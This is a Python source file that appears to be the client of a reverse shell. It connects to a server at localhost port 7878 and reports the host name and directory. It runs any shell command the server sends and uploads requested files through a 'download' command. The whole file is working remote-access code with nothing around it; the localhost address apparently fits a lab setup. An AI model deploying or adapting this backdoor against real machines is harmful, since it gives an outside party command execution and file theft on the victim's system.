import subprocess
import os
import socket
import pickle
import platform


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = "localhost"
server_port    = 7878

connection.connect(('localhost', 7878))
total_bytes_recv= 0

def get_data():

    pwd = os.getcwd()
    system_name = platform.system()

    if system_name == 'Windows':
        whoami = os.environ['COMPUTERNAME']
    elif system_name == 'Linux':
        whoami = os.uname()[1]

    data = 'Hello from Client'

    return {"pwd":pwd.strip(), "whoami":whoami.strip(), "data_type":"stdout", "data":data, "file_name":''}


while connection:
    
    if total_bytes_recv <=0:

        hostname = get_data()
        message = pickle.dumps(hostname)
        length_of_message = str(len(message)).zfill(10).encode('utf-8')
        print(length_of_message)
        connection.send(length_of_message + message)
        total_bytes_recv += len(message)

    received_msg_len = int(connection.recv(10).decode('utf-8'))
    
    while received_msg_len > 0:

        command = connection.recv(1024).decode('utf-8')

        if command.split(' ')[0] == 'cd' and len(command)>3:
            total_bytes_recv+= len(message)
            try:
                os.chdir(command.split(' ')[1])
                send_output = get_data()
                send_output["data"] = str(subprocess.check_output('pwd', shell=True).decode("utf-8"))
                send_output = pickle.dumps(send_output)
                connection.send(str(len(send_output)).zfill(10).encode('utf-8') + send_output)
            except FileNotFoundError:
                print(f'No such file or directory: {command.split(' ')[1]}')
                send_output = get_data()
                send_output["data"] = f'No such file or directory: {command.split(' ')[1]}'.encode('utf-8')
                send_output = pickle.dumps(send_output)
                connection.send(str(len(send_output)).zfill(10).encode('utf-8') + send_output)

    
            pwd = subprocess.check_output('pwd', shell=True).decode()

        elif command == 'cd':
            total_bytes_recv+= len(message)
            send_output = get_data()
            send_output["data"] = str(subprocess.check_output('pwd', shell=True).decode("utf-8"))
            send_output = pickle.dumps(send_output)
            connection.send(str(len(send_output)).zfill(10).encode('utf-8') + send_output)

        elif command == 'exit':
            
            send_output = get_data()
            send_output["data"] = str('Connection closed').encode('utf-8')
            send_output = pickle.dumps(send_output)
            connection.send(str(len(send_output)).zfill(10).encode('utf-8') + send_output)
            total_bytes_recv+= len(message)
            connection.close()
            
            break
        
        elif command.split(' ')[0] == 'download' and len(command)>9:
            send_output = get_data()
            with open(f'{command.split(' ')[1]}', 'rb') as file:
                print(f'Reading {command.split(' ')[1]}')
                send_output["data"]  = file.read()
            print(send_output["data"])
            
            #send_output["data"] = file_data
            send_output["data_type"] = "file"
            send_output["file_name"] = command.split(' ')[1].split('/')[-1]
            send_output = pickle.dumps(send_output)
            connection.send(str(len(send_output)).zfill(10).encode('utf-8') + send_output)
        else:
            
            try:
                process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
                
                while True:
                    send_output = get_data()
                    output = ''
                    while process.poll() is None:
                        output += process.stdout.readline()

                    send_output["data"] = output.strip()
                    send_output = pickle.dumps(send_output)
                    connection.send(str(len(send_output)).zfill(10).encode('utf-8') + send_output)

                    if process.poll() is not None and output == '':
                        break

            except KeyboardInterrupt:
                send_output["data"] = "Keyboard Interrupt".encode('utf-8')
                send_output = pickle.dumps(send_output)
                connection.send(str(len(send_output)).zfill(10).encode('utf-8') + send_output)

            except subprocess.CalledProcessError:
                send_output = get_data()
                if send_output["data"]:
                    send_output["data"] = "Command not valid".encode('utf-8')
                    send_output = pickle.dumps(send_output)
                    connection.send(str(len(send_output)).zfill(10).encode('utf-8') + send_output)

        received_msg_len -= 1024
